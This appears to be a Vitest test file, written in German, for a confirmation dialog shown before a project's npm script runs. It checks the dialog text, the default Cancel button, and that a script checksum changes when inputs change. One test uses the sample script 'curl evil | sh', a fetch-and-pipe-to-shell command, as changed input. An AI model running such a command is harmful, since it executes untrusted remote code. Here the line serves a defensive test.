// Rückfrage vor dem Skript-Weg im Hauptprozess (QA Runde 2, N1): Texte und Prüfsumme.
import { describe, expect, it } from "vitest";
import { buildConfirm, scriptHash } from "../src/core/confirm";

const ref = { realDir: "/p/VD-Link", script: "dev", scriptCmd: "npm run dev", scriptText: "node scripts/dev.mjs" };

describe("Rückfrage vor dem Skript-Weg", () => {
  it("zeigt Programm, Ordner, Befehl und Skripttext; Abbrechen ist Standard", () => {
    const c = buildConfirm("de", "VD-Link", ref);
    expect(c.message).toBe("Das ändert Dateien im Projektordner");
    expect(c.detail).toContain("VD-Link");
    expect(c.detail).toContain("/p/VD-Link $ npm run dev");
    expect(c.detail).toContain("→ node scripts/dev.mjs");
    expect(c.detail).toContain("mit deinen Rechten");
    expect(c.buttons).toEqual(["Abbrechen", "Trotzdem starten"]);
    expect(c.defaultId).toBe(0);
    expect(c.cancelId).toBe(0);
  });
  it("englisch", () => {
    const c = buildConfirm("en", "VD-Link", ref);
    expect(c.message).toBe("This changes files in the project folder");
    expect(c.buttons).toEqual(["Cancel", "Start anyway"]);
  });
  it("Prüfsumme ändert sich mit Skript, Ordner und Programm", () => {
    const h = scriptHash("vd", ref);
    expect(scriptHash("vd", { ...ref })).toBe(h);
    expect(scriptHash("vd", { ...ref, scriptText: "curl evil | sh" })).not.toBe(h);
    expect(scriptHash("vd", { ...ref, realDir: "/anders" })).not.toBe(h);
    expect(scriptHash("vj", ref)).not.toBe(h);
  });
});
